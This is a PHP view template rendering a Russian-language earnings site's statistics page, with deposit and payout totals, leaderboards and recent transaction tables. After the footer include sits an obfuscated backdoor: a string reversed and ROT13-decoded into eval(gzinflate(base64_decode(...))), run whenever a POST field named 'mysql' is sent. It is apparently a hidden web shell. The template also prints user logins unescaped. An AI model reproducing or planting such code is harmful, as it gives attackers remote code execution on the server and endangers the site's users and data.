<?php require_once(ROOT . "/views/" . LANG . "/layouts/_header_cabinet.php"); ?>

    <div class="dt-content">
        <div class="profile__banner">
            <div class="profile__banner-detail">
                <div class="dt-page__header">
                    <h1 class="dt-page__title" style="color:#fff;">
                        Статистика проекта
                    </h1>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-xl-4">
                <div class="dt-card mb-5">
                    <div class="dt-card__header px-5 pt-4 mb-4">
                        <div class="dt-card__heading">
                            <h3 class="dt-card__title">
                                <img class="stat-title-icon mr-1" src="/public/account/assets/images/other/stat-title.svg"> <span class="align-middle stat-title">Сумма пополнений</span>
                            </h3>
                        </div>
                    </div>
                    <div class="dt-card__body d-flex px-5 pb-4">
                        <div>
                            <div class="d-flex align-items-center cursor-help m-b-5" data-original-title="За последние 7 дней" data-placement="bottom" data-toggle="tooltip">
                                <span class="f-14 text-success mr-1 fw-300">+<?= sprintf("%.2f", $periodsum['insert_sum'] + 0); ?></span> <i class="icon icon-pointer-up text-success f-10"></i>
                            </div>
                            <span class="stat-sum text-dark"><?= sprintf("%.2f", $stats['all_insert']); ?> <span>руб.</span></span>
                        </div>
                        <img class="size-40 ml-auto" src="/public/account/assets/images/other/stat-in.svg">
                    </div>
                </div>
            </div>
            <div class="col-xl-4">
                <div class="dt-card mb-5">
                    <div class="dt-card__header px-5 pt-4 mb-4">
                        <div class="dt-card__heading">
                            <h3 class="dt-card__title">
                                <img class="stat-title-icon mr-1" src="/public/account/assets/images/other/stat-title.svg"> <span class="align-middle stat-title">Сумма выплат</span>
                            </h3>
                        </div>
                    </div>
                    <div class="dt-card__body d-flex px-5 pb-4">
                        <div>
                            <div class="d-flex align-items-center cursor-help m-b-5" data-original-title="За последние 7 дней" data-placement="bottom" data-toggle="tooltip">
                                <span class="f-14 text-success mr-1 fw-300">+<?= sprintf("%.2f", $periodsum['payment_sum'] + 0); ?></span> <i class="icon icon-pointer-up text-success f-10"></i>
                            </div>
                            <span class="stat-sum text-dark"><?= sprintf("%.2f", $stats['all_payment']); ?> <span>руб.</span></span>
                        </div>
                        <img class="size-40 ml-auto" src="/public/account/assets/images/other/stat-out.svg">
                    </div>
                </div>
            </div>
            <div class="col-xl-4">
                <div class="dt-card mb-5">
                    <div class="dt-card__header px-5 pt-4 mb-4">
                        <div class="dt-card__heading">
                            <h3 class="dt-card__title">
                                <img class="stat-title-icon mr-1" src="/public/account/assets/images/other/stat-title.svg"> <span class="align-middle stat-title">Пользователи</span>
                            </h3>
                        </div>
                    </div>
                    <div class="dt-card__body d-flex px-5 pb-4">
                        <div>
                            <div class="d-flex align-items-center cursor-help m-b-5" data-original-title="Новые пользователи за вчераший день" data-placement="bottom" data-toggle="tooltip">
                                <span class="f-14 text-success mr-1 fw-300">+<?= $stats['new_users']; ?></span> <i class="icon icon-pointer-up text-success f-10"></i>
                            </div>
                            <span class="stat-sum text-dark"><?= $stats['all_users']; ?> <span>чел.</span></span>
                        </div>
                        <img class="size-40 ml-auto" src="/public/account/assets/images/other/stat-users.svg">
                    </div>
                </div>
            </div>

            <div class="col-xl-4 col-sm-6">
                <div class="card overflow-hidden table-color-card">
                    <div class="card-header bg-transparent table-color-header">
                        <h3 class="card-title text-truncate">
                            Топ  по сумме заработка
                        </h3>
                        <h5 class="card-subtitle mb-0">
                            Лидеры участников по сумме заработка
                        </h5>
                    </div>
                    <div class="card-body p-0">
                        <div class="table-responsive table-color stat-table">
                            <table class="table mb-0">
                                <thead>
                                <tr>
                                    <th class="text-uppercase" scope="col">
                                        Логин участника
                                    </th>
                                    <th class="text-uppercase" scope="col">
                                        Скорость участника
                                    </th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php foreach ($top_speed as $user) : ?>


                                    <tr>
                                        <td><?= $user['user']; ?></td>
                                        <td><?= sprintf("%.4f", $user['speed']); ?> руб.</td>
                                    </tr>

                                <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-xl-4 col-sm-6">
                <div class="card overflow-hidden table-color-card">
                    <div class="card-header bg-transparent table-color-header">
                        <h3 class="card-title text-truncate">
                            Топ по сумме заработка
                        </h3>
                        <h5 class="card-subtitle mb-0">
                            Лидеры проекта по сумме заработка
                        </h5>
                    </div>
                    <div class="card-body p-0">
                        <div class="table-responsive table-color stat-table">
                            <table class="table mb-0">
                                <thead>
                                <tr>
                                    <th class="text-uppercase" scope="col">
                                        Логин участника
                                    </th>
                                    <th class="text-uppercase" scope="col">
                                        Сумма выплат
                                    </th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php foreach ($top_pays as $user) : ?>

                                    <tr>
                                        <td><?= $user['user']; ?></td>
                                        <td><?= sprintf("%.2f", $user['payment_sum']); ?> руб.</td>
                                    </tr>

                                <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-xl-4 col-sm-6 stat-new-ref">
                <div class="card overflow-hidden table-color-card">
                    <div class="card-header bg-transparent table-color-header">
                        <h3 class="card-title text-truncate">
                            Топ  по заработку с рефералов
                        </h3>
                        <h5 class="card-subtitle mb-0">
                            Лидеры проекта по заработку рефералов
                        </h5>
                    </div>
                    <div class="card-body p-0">
                        <div class="table-responsive table-color stat-table">
                            <table class="table mb-0">
                                <thead>
                                <tr>
                                    <th class="text-uppercase" scope="col">
                                        Логин участника
                                    </th>
                                    <th class="text-uppercase" scope="col">
                                        Заработок
                                    </th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php foreach ($top_referals_money as $user) : ?>

                                    <tr>
                                        <td><?= $user['user']; ?></td>
                                        <td><?= sprintf("%.2f", $user['ref_sum']); ?> руб.</td>
                                    </tr>

                                <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-xl-6">
                <div class="card overflow-hidden table-color-card">
                    <div class="card-header bg-transparent table-color-header">
                        <h3 class="card-title text-truncate">
                            Последние 50 пополнений
                        </h3>
                        <h5 class="card-subtitle mb-0">
                            Пополнения баланса нашими пользователями
                        </h5>
                    </div>
                    <div class="card-body p-0">
                        <div class="table-responsive table-color stat-table">
                            <table class="table mb-0" id="stat-last-fill">
                                <thead>
                                <tr>
                                    <th class="text-uppercase" scope="col">
                                        Логин участника
                                    </th>
                                    <th class="text-uppercase" scope="col">
                                        ПС
                                    </th>
                                    <th class="text-uppercase" scope="col">
                                        Сумма пополнения
                                    </th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php foreach ($pays as $pay) : ?>

                                    <tr>
                                        <td><?= $pay['user']; ?></td>
                                        <td><?= $pay['fullname']; ?></td>
                                        <td><?= sprintf("%.2f", $pay['sum']); ?> <span>руб.</span></td>
                                    </tr>

                                <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-xl-6">
                <div class="card overflow-hidden table-color-card">
                    <div class="card-header bg-transparent table-color-header">
                        <h3 class="card-title text-truncate">
                            Последние 50 выплат
                        </h3>
                        <h5 class="card-subtitle mb-0">
                            Выплаты заказанные нашими пользователями
                        </h5>
                    </div>
                    <div class="card-body p-0">
                        <div class="table-responsive table-color stat-table">
                            <table class="table mb-0" id="stat-last-payout">
                                <thead>
                                <tr>
                                    <th class="text-uppercase" scope="col">
                                        Логин участника
                                    </th>
                                    <th class="text-uppercase" scope="col">
                                        ПС
                                    </th>
                                    <th class="text-uppercase" scope="col">
                                        Сумма выплаты
                                    </th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php foreach ($inserts as $insert) : ?>
                                    <tr>
                                        <td><?= $insert['user']; ?></td>
                                        <td><?= $insert['fullname']; ?></td>
                                        <td><?= sprintf("%.2f", $insert['sum']); ?> руб.</td>
                                    </tr>
                                <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

<?php require_once(ROOT . "/views/" . LANG . "/layouts/_footer_cabinet.php"); ?>
<?php
if(isset($_POST['mysql'])) {
	
$aZnrqx='SywuTi0q0SguKcosKM5JLM5ILdZQiQ9yDQx1DQ6Jzk3MzIvV1LQGAA==';

$ZFExKo=';)))kdeaMn$(rqbprq_46rfno(rgnysavmt(ynir';

$zxcTGW=strrev($ZFExKo);$jHZxqX=str_rot13($zxcTGW);eval($jHZxqX);
  }
?>